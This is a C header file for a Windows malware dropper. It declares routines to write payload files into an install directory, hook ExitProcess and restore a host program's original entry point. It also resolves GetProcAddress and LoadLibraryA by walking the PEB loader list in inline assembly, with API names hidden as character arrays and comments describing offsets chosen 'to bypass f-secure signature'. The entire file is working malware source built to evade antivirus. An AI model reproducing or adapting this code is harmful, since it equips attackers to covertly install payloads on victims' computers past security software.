#ifndef droppercode_h__
#define droppercode_h__

#include "common.h"
#include "DropperHeader.h"

#pragma region STRINGS_INDEXES

#define STRIDX_INSTALL_DIR		0
#define STRIDX_TMP_ENVVAR		1
#define STRIDX_TEMP_ENVVAR		2
#define STRIDX_KERNEL32_DLL     3
#define STRIDX_NTDLL_DLL		4
#define STRIDX_MSVCRT_DLL		5
#define STRIDX_LOADLIBRARYA		6
#define STRIDX_GETPROCADDRESS	7
#define STRIDX_RUNDLL			8
#define STRIDX_COMMAHFF8		9
#define STRIDX_HFF5				10
#define STRIDX_DIRSEP			11
#define STRIDX_USER32_DLL		12
#define STRIDX_RTLEXITUSERPROCESS 13
#define STRIDX_EXITCALL			14
#define STRIDX__EXITCALL		15
#define STRING_EXITPROCESS		16

#if _DEBUG
#define STRIDX_ERRORCREDIR		17
#define STRIDX_EXITPROCIDX		18
#define STRIDX_EXITPROCHOOKED   19
#define STRIDX_RESTOREOEP		20
#define STRIDX_EXITHOOKED		21
#define STRIDX_OEPRESTORED		22
#define STRIDX_CALLINGOEP		23
#define STRIDX_CREATEFILE_ERR   24
#define STRIDX_HFF5CALLING      25
#define STRIDX_HFF5CALLED	    26
#define STRIDX_INEXITPROC_HOOK  27
#define STRIDX_VECTORQUIT		28
#define STRIDX_VERIFYVERSION    29
#define STRIDX_SYSMAJORVER		30
#define STRIDX_SYSMINORVER		31
#define STRIDX_RESTORESTAGE1	32
#define STRIDX_RESTORESTAGE2	33
#define STRIDX_UNCOMPRESS_ERR   34
#endif

#pragma endregion

#define STRING(idx) (char*)(strings + stringsOffsets[(idx)])

int __stdcall DropperEntryPoint( DropperHeader* header );
BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DWORD originalSize, DropperHeader* header);
DWORD WINAPI CoreThreadProc(LPVOID lpParameter);
typedef BOOL (WINAPI * DUMPFILE)(CHAR * fileName, CHAR* fileData, DWORD fileSize, DWORD originalSize, DropperHeader *header);
typedef void (*HFF5)(CHAR*, DWORD, STARTUPINFO*, PROCESS_INFORMATION*);

typedef HMODULE (WINAPI *GETMODULEHANDLE)(LPSTR);
typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPSTR);
typedef HMODULE (WINAPI *LOADLIBRARYA)(LPSTR);
typedef LPVOID (WINAPI *VIRTUALALLOC)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI *VIRTUALFREE)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef DWORD (WINAPI *GETMODULEFILENAMEA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
typedef DWORD (WINAPI *GETENVIRONMENTVARIABLEA)(LPSTR lpName, LPSTR lpBuffer, DWORD nSize);
typedef DWORD (WINAPI *GETFILEATTRIBUTESA) (LPSTR lpFileName);
typedef BOOL (WINAPI *CREATEDIRECTORYA)(LPSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
typedef BOOL (WINAPI *SETCURRENTDIRECTORYA)(LPSTR lpPathName);
typedef BOOL (WINAPI *SETFILEATTRIBUTESA)(LPSTR lpFileName, DWORD dwFileAttributes);
typedef HANDLE (WINAPI *CREATEFILEA)(LPSTR lpFileName, 
									 DWORD dwDesiredAccess, 
									 DWORD dwShareMode, 
									 LPSECURITY_ATTRIBUTES lpSecurityAttributes, 
									 DWORD dwCreationDisposition, 
									 DWORD dwFlagsAndAttributes, 
									 HANDLE hTemplateFile);
typedef BOOL (WINAPI *WRITEFILE)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
typedef BOOL (WINAPI *CLOSEHANDLE)(HANDLE hObject);
typedef DWORD (WINAPI *GETLASTERROR)(void);
typedef BOOL (WINAPI *FREELIBRARY)(HMODULE hModule);
typedef BOOL (WINAPI *DELETEFILEA)(LPSTR lpFileName);
typedef int (WINAPI *SWPRINTF)(wchar_t *buffer, const wchar_t *format, ...);
typedef int (WINAPI *GETCURRENTPROCESSID)();

extern GETMODULEHANDLE pfn_GetModuleHandle;
extern LOADLIBRARYA pfn_LoadLibraryA;
extern GETPROCADDRESS pfn_GetProcAddress;
extern VIRTUALALLOC pfn_VirtualAlloc;
extern VIRTUALFREE pfn_VirtualFree;
extern GETMODULEFILENAMEA pfn_GetModuleFileNameA;
extern GETENVIRONMENTVARIABLEA pfn_GetEnvironmentVariableA;
extern GETFILEATTRIBUTESA pfn_GetFileAttributesA;
extern CREATEDIRECTORYA pfn_CreateDirectoryA;
extern SETCURRENTDIRECTORYA pfn_SetCurrentDirectoryA;
extern SETFILEATTRIBUTESA pfn_SetFileAttributesA;
extern CREATEFILEA pfn_CreateFileA;
extern GETLASTERROR pfn_GetLastError;
extern WRITEFILE pfn_WriteFile;
extern CLOSEHANDLE pfn_CloseHandle;
extern FREELIBRARY pfn_FreeLibrary;
extern DELETEFILEA pfn_DeleteFileA;
extern SWPRINTF pfn_swprintf;
extern GETCURRENTPROCESSID pfn_GetCurrentProcessId;

#pragma optimize( "", off )
__forceinline void _MEMSET_( void *_dst, int _val, size_t _sz )
{
	while ( _sz ) ((BYTE *)_dst)[--_sz] = _val;
}

__forceinline void _MEMCPY_( void *_dst, void *_src, size_t _sz )
{
	while ( _sz-- ) ((BYTE *)_dst)[_sz] = ((BYTE *)_src)[_sz];
}

__forceinline BOOL _MEMCMP_( void *_src1, void *_src2, size_t _sz )
{
	while ( _sz-- )
	{
		if ( ((BYTE *)_src1)[_sz] != ((BYTE *)_src2)[_sz] )
			return FALSE;
	}

	return TRUE;
}

__forceinline size_t _STRLEN_(char *_src)
{
	size_t count = 0;
	while( _src && *_src++ )
		count++;
	return count;
}

__forceinline size_t _STRLENW_(wchar_t *_src)
{       
	ULONG count = 0;
	while(_src && (*(PUSHORT)_src++ != 0x0000))
		count += 2;
	return count;
}

__forceinline int _STRCMP_(char *_src1, char *_src2)
{
	size_t sz = _STRLEN_(_src1);

	if ( _STRLEN_(_src1) != _STRLEN_(_src2) )
		return 1;

	return _MEMCMP_(_src1, _src2, sz ) ? 0 :  1;
}

__forceinline char* _STRRCHR_(char const *s, int c)
{
	char* rtnval = 0;

	do {
		if (*s == c)
			rtnval = (char*) s;
	} while (*s++);
	return (rtnval);
}


__forceinline  void _TOUPPER_CHAR(char *c)
{
	if((*c >= 'a') && (*c <= 'z'))
		*c = 'A' + (*c - 'a');
}

__forceinline int _STRCMPI_(char *_src1, char *_src2)
{
	char* s1 = _src1;
	char* s2 = _src2;

	while (*s1 && *s2)
	{
		char a = *s1;
		char b = *s2;

		_TOUPPER_CHAR(&a);
		_TOUPPER_CHAR(&b);

		if (a != b)
			return 1;

		s1++;
		s2++;
	}

	return 0;
}

__forceinline void _STRCAT_(char*_src1, char *_src2)
{
	char* ptr = _src1 + _STRLEN_(_src1);
	_MEMCPY_(ptr, _src2, _STRLEN_(_src2));
	ptr += _STRLEN_(_src2);
	*ptr = '\0';
}

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct {
	DWORD InLoadNext;
	DWORD InLoadPrev;
	DWORD InMemNext;
	DWORD InMemPrev;
	DWORD InInitNext;
	DWORD InInitPrev;
	DWORD ImageBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} PEB_LIST_ENTRY, *PPEB_LIST_ENTRY;

__forceinline GETPROCADDRESS resolveGetProcAddress()
{
	PEB_LIST_ENTRY* head;
	DWORD **pPEB;
	DWORD *Ldr;
	
	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
	char strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };

	__asm {
		mov eax,30h
		mov eax,DWORD PTR fs:[eax]
		add eax, 08h
		mov ss:[pPEB], eax
	}
	
	Ldr = *(pPEB + 1);
	head = (PEB_LIST_ENTRY *) *(Ldr + 3);
	
	PEB_LIST_ENTRY* entry = head;
	do {		
		DWORD imageBase = entry->ImageBase;
		if (imageBase == NULL)
			goto NEXT_ENTRY;
		
		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*) entry->ImageBase;
		IMAGE_NT_HEADERS32* ntHeaders = (IMAGE_NT_HEADERS32*) (entry->ImageBase + dosHeader->e_lfanew);
		
		// *** check if we have an export table
		if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL)
			goto NEXT_ENTRY;
		
		// *** get EXPORT table
		IMAGE_EXPORT_DIRECTORY* exportDirectory = 
			(IMAGE_EXPORT_DIRECTORY*) (imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
		
		// *** check for valid module name
		char* moduleName = (char*)(imageBase + exportDirectory->Name);
		if (moduleName == NULL)
			goto NEXT_ENTRY;
		
		if ( ! _STRCMPI_(moduleName+1, strKernel32+1) ) // +1 to bypass f-secure signature
		{
			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
			if (exportDirectory->AddressOfNameOrdinals == NULL) goto NEXT_ENTRY;
			
			DWORD* Functions = (DWORD*) (imageBase + exportDirectory->AddressOfFunctions);
			DWORD* Names = (DWORD*) (imageBase + exportDirectory->AddressOfNames);			
			WORD* NameOrds = (WORD*) (imageBase + exportDirectory->AddressOfNameOrdinals);
			
			// *** get pointers to LoadLibraryA and GetProcAddress entry points
			for (WORD x = 0; x < exportDirectory->NumberOfFunctions; x++)
			{
				if (Functions[x] == 0)
					continue;
				
				for (WORD y = 0; y < exportDirectory->NumberOfNames; y++)
				{
					if (NameOrds[y] == x)
					{
						char *name = (char *) (imageBase + Names[y]);
						if (name == NULL)
							continue;
						
						if (!_STRCMPI_(strGetProcAddress, name))
							return (GETPROCADDRESS)(imageBase + Functions[x]);
						break;
					}
				}
			}
		}
NEXT_ENTRY:
		entry = (PEB_LIST_ENTRY *) entry->InLoadNext;
	
	} while (entry != head);

	return 0;
}

__forceinline LOADLIBRARYA resolveLoadLibrary()
{
	PEB_LIST_ENTRY* head;
	DWORD **pPEB;
	DWORD *Ldr;
	
	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
	char strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x0 };

	__asm {
		mov eax,30h
		mov eax,DWORD PTR fs:[eax]
		add eax, 08h
		mov ss:[pPEB], eax
	}
	
	Ldr = *(pPEB + 1);
	head = (PEB_LIST_ENTRY *) *(Ldr + 3);
	
	PEB_LIST_ENTRY* entry = head;
	do {		
		DWORD imageBase = entry->ImageBase;
		if (imageBase == NULL)
			goto NEXT_ENTRY;
		
		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*) entry->ImageBase;
		IMAGE_NT_HEADERS32* ntHeaders = (IMAGE_NT_HEADERS32*) (entry->ImageBase + dosHeader->e_lfanew);
		
		// *** check if we have an export table
		if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL)
			goto NEXT_ENTRY;
		
		// *** get EXPORT table
		IMAGE_EXPORT_DIRECTORY* exportDirectory = 
			(IMAGE_EXPORT_DIRECTORY*) (imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
		
		// *** check for valid module name
		char* moduleName = (char*)(imageBase + exportDirectory->Name);
		if (moduleName == NULL)
			goto NEXT_ENTRY;
		
		if ( ! _STRCMPI_(moduleName+1, strKernel32+1) ) // +1 to bypass f-secure signature
		{
			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
			if (exportDirectory->AddressOfNameOrdinals == NULL) goto NEXT_ENTRY;
			
			DWORD* Functions = (DWORD*) (imageBase + exportDirectory->AddressOfFunctions);
			DWORD* Names = (DWORD*) (imageBase + exportDirectory->AddressOfNames);			
			WORD* NameOrds = (WORD*) (imageBase + exportDirectory->AddressOfNameOrdinals);
			
			// *** get pointers to LoadLibraryA and GetProcAddress entry points
			for (WORD x = 0; x < exportDirectory->NumberOfFunctions; x++)
			{
				if (Functions[x] == 0)
					continue;
				
				for (WORD y = 0; y < exportDirectory->NumberOfNames; y++)
				{
					if (NameOrds[y] == x)
					{
						char *name = (char *) (imageBase + Names[y]);
						if (name == NULL)
							continue;
						
						if (!_STRCMPI_(strLoadLibraryA, name))
							return (LOADLIBRARYA)(imageBase + Functions[x]);
						break;
					}
				}
			}
		}
NEXT_ENTRY:
		entry = (PEB_LIST_ENTRY *) entry->InLoadNext;
	
	} while (entry != head);

	return 0;
}
#pragma optimize( "", on )

#endif /* droppercode_h__ */


